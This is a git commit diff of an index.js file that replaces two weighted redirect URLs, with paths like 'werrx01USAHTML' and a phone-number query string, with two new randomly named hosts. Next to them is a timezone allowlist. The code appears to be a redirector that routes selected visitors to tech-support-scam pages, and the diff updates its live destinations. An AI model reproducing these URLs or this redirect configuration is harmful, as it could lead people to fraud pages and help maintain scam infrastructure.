4c62348469f10a49f3b2bc0d78ecd86ed4eeac24
paalakash <palaksh452@gmail.com>
2026-07-14 08:20:14 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,8 +34,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://shark-app-vzkwm.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 0.3 },
-    { url: "https://urchin-app-lep94.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 0.7 }
+    { url: "https://hsdgdsdsfgvdf.on-forge.com/werrx01USAHTML/?bcda", weight: 0.3 },
+    { url: "https://vnskdjvdsfds.on-forge.com/werrx01USAHTML/?bcda=1800-549-821", weight: 0.7 }
     
 ];
 
